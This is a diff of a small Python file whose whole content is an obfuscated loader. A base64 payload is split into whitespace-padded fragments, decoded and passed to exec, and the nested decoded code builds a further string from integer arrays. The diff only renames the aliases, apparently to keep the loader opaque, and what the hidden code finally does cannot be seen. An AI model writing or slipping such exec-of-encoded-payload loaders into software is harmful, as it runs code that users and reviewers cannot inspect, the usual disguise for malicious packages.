@@ -1,7 +1,7 @@
-import base64 as _
-_._ = _.decodebytes
-___ = exec
-__ = b'Cm'+                  b'ltcG9ydCBiYXNlNjQgYXM'+           b'gX19fX19fXwpfX19fX19'+                                                                     \
+import base64 as V
+V.ME = V.decodebytes
+KFC = exec
+五十 = b'Cm'+                  b'ltcG9ydCBiYXNlNjQgYXM'+           b'gX19fX19fXwpfX19fX19'+                                                                     \
      b'fL'+                  b'l9'+                              b'fX'+                                                                                       \
      b'19'+         b'fX'+   b'19'+                              b'fI'+                                                                                       \
      b'D0'+        b'gX'+    b'19'+                              b'fX'+                                                                                       \
@@ -36,4 +36,4 @@ __ = b'Cm'+                  b'ltcG9ydCBiYXNlNjQgYXM'+           b'gX19fX19fXwpf
                  b'At\nOTY5LCAtMzc1LCAtOTI1LCAtMzc0LCAtNzIsIC0xOTksIC02MTQsIC0xNDhdCl9fX19fID0gIiIK\nCmZvciBfX19fX18gaW4gX19fX19fX19fXyhfX19'+\
                   b'fX19fX19fXyhfKSk6CiAgICBfX19fXys9X19f\nX19fX19fX19fKF9bX19fX19fXStfX19fW19fX19fX10tX19bX19fX19fXSpfX19bX19fX19fXSkK\nX19fX1'+\
                    b'9fX19fKF9fX19fX18uX19fX19fX18oX19fX18uZW5jb2RlKCkpLmRlY29kZSgpKQo=\n'
-___(_._(__))
+KFC(V.ME(五十))
